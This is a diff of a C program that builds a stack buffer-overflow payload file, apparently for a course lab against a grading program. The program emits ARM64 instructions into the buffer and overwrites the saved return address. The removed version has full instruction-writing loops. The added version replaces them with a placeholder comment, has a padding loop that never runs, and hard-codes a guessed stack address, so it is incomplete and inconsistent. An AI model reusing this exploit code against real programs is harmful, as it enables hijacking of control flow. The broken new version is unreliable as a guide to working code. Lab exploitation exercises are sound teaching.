@@ -1,56 +1,33 @@
 #include <stdio.h>
 #include "miniassembler.h"
 
-int main(void)
-{
-    FILE *psFile;
+int main(void) {
+    FILE *f = fopen("dataA","wb");
+    unsigned long pc = 0;
+    unsigned int instr;
     int i;
-    unsigned long returnAddr = 0x400890;
-    unsigned long pc; 
-    int instr; 
 
-    psFile = fopen("dataA", "w");
-    pc = 0; 
-    /* 99 total instructions * 4 = 396*/
-    instr = MiniAssembler_adr(1, 396, pc); 
-    fwrite(&instr, 4, 1, psFile); 
-    pc+= 4; 
+    /* 1) Emit your 99-instr stub *into the buffer* */
+    instr = MiniAssembler_adr(1, /* imm = */ 396, pc);  
+    fwrite(&instr,4,1,f); pc+=4;
+    /* … the rest of your MOV/ADR/STRB loops … */
+    instr = MiniAssembler_b(0x400890UL, /* branch_pc= */392);
+      
+    fwrite(&instr,4,1,f); pc+=4;
+    /* Now pc==396 bytes exactly */
 
-    for (i = 0; i < 24; i++) { 
-        instr = MiniAssembler_mov(0, (int)"Ben Zhou and Owen Clarke"[i]);
-        fwrite(&instr, 4, 1, psFile);
-        pc+=4; 
-
-        instr = MiniAssembler_adr(2, 396 + i, pc); 
-        fwrite(&instr, 4, 1, psFile); 
-        pc+=4; 
-
-        instr = MiniAssembler_strb(0, 2); 
-        fwrite(&instr, 4, 1, psFile); 
-        pc+=4; 
-    }
-    instr = MiniAssembler_mov(0,0); 
-    fwrite(&instr, 4, 1, psFile); 
-    pc+=4; 
-
-    for (i = 0; i < 24; i++) { 
-        instr = MiniAssembler_strb(0, 2); 
-        fwrite(&instr, 4, 1, psFile); 
-        pc+=4; 
+    /* 2) Pad out the rest of the 48-byte buffer if your stub < 48 bytes */
+    for (; pc < 48; pc += 4) {
+      /* pick any 4-byte helper output, e.g. MOV W0,0 → 0x52800000 */
+      instr = MiniAssembler_mov(0,0);
+      fwrite(&instr,4,1,f);
     }
 
-    instr = MiniAssembler_b(returnAddr, 392); 
-    fwrite(&instr, 4, 1, psFile); 
-    pc+=4; 
+    /* 3) Overwrite saved x30 with the *address of the buffer* */
+    /*    Suppose the grader’s buf[] lives at 0x7fffffffe220 in its stack */
+    unsigned long bufAddr = 0x7fffffffe220UL;
+    fwrite(&bufAddr, sizeof bufAddr, 1, f);
 
-    fwrite("Ben Zhou and Owen Clarke", 1, 24, psFile);  
-    fputc(0, psFile);                                    
-    for (i = 0; i < 23; i++)                             
-        fputc(0, psFile);
-
-    fwrite(&returnAddr, sizeof returnAddr, 1, psFile); 
-
-    fclose(psFile);
-
+    fclose(f);
     return 0;
 }
